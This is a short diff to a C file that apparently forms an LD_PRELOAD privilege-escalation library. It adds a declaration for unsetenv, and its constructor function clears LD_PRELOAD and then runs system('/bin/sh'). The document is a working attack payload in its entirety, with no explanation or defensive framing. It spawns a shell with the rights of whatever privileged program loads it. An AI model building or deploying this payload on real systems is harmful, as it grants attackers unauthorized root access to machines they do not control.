@@ -3,6 +3,10 @@
 
 #include <stdlib.h>
 
+#ifndef unsetenv
+extern int unsetenv(const char *);
+#endif
+
 void __attribute__((constructor)) my_ctor(void) {
     unsetenv("LD_PRELOAD");         // Critical to avoid small Fork Bomb
     system("/bin/sh");
